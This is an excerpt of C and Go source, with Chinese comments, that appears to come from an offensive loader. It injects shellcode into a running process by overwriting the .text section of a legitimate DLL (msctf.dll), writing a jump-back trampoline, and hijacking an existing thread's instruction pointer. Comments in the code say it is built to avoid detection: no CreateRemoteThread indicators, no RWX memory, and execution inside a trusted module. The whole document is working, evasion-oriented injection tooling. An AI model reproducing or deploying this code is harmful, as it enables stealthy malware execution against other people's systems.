...
int module_stomp_inject(int pid, unsigned char* shellcode, int shellcodeLen, const char* dllPath) {
    ...
    HANDLE hHijackThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    if (!hHijackThread) {
        CloseHandle(hProcess);
        return -16;
    }

    DWORD suspendCount = SuspendThread(hHijackThread);
    if (suspendCount == (DWORD)-1) {
        CloseHandle(hHijackThread);
        CloseHandle(hProcess);
        return -17;
    }
    ...
    if (!GetThreadContext(hHijackThread, &ctx)) {
        ResumeThread(hHijackThread);
        CloseHandle(hHijackThread);
        CloseHandle(hProcess);
        return -18;
    }

    // 在 shellcode 后写入 trampoline（跳回原 RIP）
    LPVOID trampolineAddr = (LPVOID)(textAddr + (SIZE_T)writeSize);
    unsigned char trampoline[14];
    DWORD64 originalRip = ctx.Rip;
    trampoline[0] = 0xFF; trampoline[1] = 0x25; // jmp [rip+disp32]
    trampoline[2] = 0; trampoline[3] = 0; trampoline[4] = 0; trampoline[5] = 0;
    memcpy(&trampoline[6], &originalRip, 8);

    DWORD trampOldProtect;
    SIZE_T trampWritten = 0;
    if (!VirtualProtectEx(hProcess, trampolineAddr, 14, PAGE_READWRITE, &trampOldProtect)) {
        ResumeThread(hHijackThread);
        CloseHandle(hHijackThread);
        CloseHandle(hProcess);
        return -19;
    }
    if (!WriteProcessMemory(hProcess, trampolineAddr, trampoline, 14, &trampWritten)) {
        ResumeThread(hHijackThread);
        CloseHandle(hHijackThread);
        CloseHandle(hProcess);
        return -20;
    ...
    // 劫持 RIP 指向 .text 页（shellcode 起始）
    ctx.Rip = (DWORD64)textAddr;
    if (!SetThreadContext(hHijackThread, &ctx)) {
        ResumeThread(hHijackThread);
        CloseHandle(hHijackThread);
        CloseHandle(hProcess);
        return -21;
...
// InjectViaStompHijack 使用 Module Stomping + Thread Hijack 注入。
// 在目标进程中加载合法 DLL，覆写其 .text 节为 shellcode，劫持已有线程执行。
// 无 CreateRemoteThread IOC，无 RWX 内存，执行地址在合法 DLL 范围内。
func InjectViaStompHijack(cfg *LoadConfig) *LoadResult {
	if cfg.PID <= 0 || len(cfg.Shellcode) == 0 {
		return &LoadResult{
			Success: false,
			Message: "invalid pid or empty shellcode",
	...
	ret := C.module_stomp_inject(
		...
		(*C.uchar)(unsafe.Pointer(&cfg.Shellcode[0])),
		C.int(len(cfg.Shellcode)),
		nil, // NULL = use default DLL (msctf.dll)
	)

	if ret != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("stomp+hijack failed: code=%d", int(ret)),
		}
	}

	return &LoadResult{
		Success: true,
		Message: fmt.Sprintf("module stomp+hijack via msctf.dll: shellcode injected (pid=%d)", cfg.PID),
	}
}
